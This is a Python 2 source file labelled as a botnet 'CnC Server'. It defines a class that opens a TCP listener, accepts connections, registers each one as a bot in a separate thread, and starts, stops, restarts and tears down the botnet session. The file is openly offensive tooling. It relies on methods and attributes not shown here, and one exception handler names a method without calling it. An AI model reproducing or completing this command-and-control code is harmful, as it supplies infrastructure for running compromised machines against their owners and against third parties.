# Date: 09/28/2017
# Author: Ethical-H4CK3R
# Description: CnC Server

import time
import socket
import threading

class Server(object):
 ''' Command & Control '''
 
 def __init__(self):
  self.server = None
  self.server_status = False 
  
 def kill(self, session):
  try:
   session.shutdown(socket.SHUT_RDWR)
   session.close()
  except:pass
    
 def disconnect(self, exit=False):
  if exit:
   print '\n[-] Exiting ...'
   time.sleep(2.5)

  self.server_status = False
  self.alive = False 
  self.ping = False
  self.kill(self.server)
  del self.botnet[:] 

 def cncServer(self):
  while self.alive and self.server_status:
   try:
    session, ip = self.server.accept() 
    threading.Thread(target=self.addBot, args=[session]).start() 
   except socket.timeout:pass
   except:self.restartServer
  
 def startServer(self, verbose=True):
  try:
   if self.server_status:self.restartServer();return
   if verbose:print 'Starting server on {}:{} ...'.format(self.ip, self.port)
   time.sleep(2.5)
   self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   self.server.bind((self.ip, self.port))
   self.server.settimeout(0.5)
   self.server.listen(1)
   self.server_status = True
   self.activeIP = self.ip
   self.activePort = self.port
   threading.Thread(target=self.cncServer).start()    
  except:
   print '[-] Error: Failed to start server, validate you IP address and try again'

 def stopServer(self, verbose=True):
  try:
   if not self.server_status:return
   if verbose:print 'Stopping server ...'
   time.sleep(2.5)
   self.disconnect()
  except:
   print '[-] Error: Failed to stop server'

 def restartServer(self):
  try:
   if not self.server_status:self.startServer();return
   print 'Restarting server on {}:{} ...'.format(self.ip, self.port)
   time.sleep(2.5)
   self.stopServer(False)
   self.startServer(False)
  except:pass 
